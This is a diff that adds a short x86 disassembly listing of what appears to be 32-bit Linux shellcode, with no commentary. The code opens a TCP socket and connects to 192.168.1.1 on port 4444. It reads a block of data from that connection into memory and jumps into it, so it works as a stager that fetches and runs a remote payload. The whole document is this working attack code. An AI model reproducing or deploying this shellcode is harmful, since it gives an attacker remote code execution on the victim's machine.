@@ -1,0 +1,29 @@
+00000000  31DB              xor ebx,ebx
+00000002  53                push ebx
+00000003  43                inc ebx
+00000004  53                push ebx
+00000005  6A02              push byte +0x2
+00000007  6A66              push byte +0x66
+00000009  58                pop eax
+0000000A  89E1              mov ecx,esp
+0000000C  CD80              int 0x80
+0000000E  97                xchg eax,edi
+0000000F  5B                pop ebx
+00000010  68C0A80101        push dword 0x101a8c0
+00000015  6668115C          push word 0x5c11
+00000019  6653              push bx
+0000001B  89E1              mov ecx,esp
+0000001D  6A66              push byte +0x66
+0000001F  58                pop eax
+00000020  50                push eax
+00000021  51                push ecx
+00000022  57                push edi
+00000023  89E1              mov ecx,esp
+00000025  43                inc ebx
+00000026  CD80              int 0x80
+00000028  5B                pop ebx
+00000029  99                cdq
+0000002A  B60C              mov dh,0xc
+0000002C  B003              mov al,0x3
+0000002E  CD80              int 0x80
+00000030  FFE1              jmp ecx
